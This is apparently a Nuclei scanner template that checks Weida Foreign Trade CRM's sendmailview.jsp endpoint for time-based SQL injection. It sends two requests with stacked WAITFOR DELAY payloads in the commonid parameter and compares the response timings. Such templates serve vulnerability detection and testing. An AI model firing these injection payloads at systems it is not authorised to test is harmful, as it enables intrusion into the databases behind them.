id: poc-yaml-weidasoft-sendmailview-sqli
info:
  name: "Weida Foreign Trade CRM sendmailview SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: Weida
  description: |
    The sendmailview functionality in Weida Foreign Trade CRM has a SQL Injection vulnerability. This allows an attacker to execute arbitrary SQL queries, potentially leading to data exfiltration or system compromise.

http:
  - raw:
      - |
        GET /wap/common/sendmailview.jsp?commonid=1%27;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei
      - |
        GET /wap/common/sendmailview.jsp?commonid=1%27;WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "window.parent.open"
          - "id=\"sendmailViewPage\""
      - type: dsl
        dsl:
          - "status_code == 200"
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
